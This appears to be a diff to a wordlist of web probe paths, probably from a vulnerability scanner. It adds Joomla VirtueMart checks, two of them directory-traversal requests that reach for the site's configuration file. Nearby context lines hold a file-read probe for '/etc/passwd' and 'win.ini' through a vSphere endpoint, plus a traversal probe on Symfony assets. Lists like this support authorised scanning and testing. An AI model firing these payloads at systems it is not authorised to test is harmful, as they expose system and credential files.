@@ -756,3 +756,6 @@
 /vsphere-client/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file%3a///etc/passwd
 /vsphere-client/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file%3a///c%3a/windows/win.ini
 /assets/images/%2e%2e/%2e%2e/vendor/symfony/error-handler/Resources/assets/images/symfony-logo.svg
+/modules/mod_virtuemart_cart/mod_virtuemart_cart.xml
+/index.php?option=com_virtuemart&view=../../../nonexistent&tmpl=component
+/index.php?option=com_virtuemart&view=../../../configuration&tmpl=component
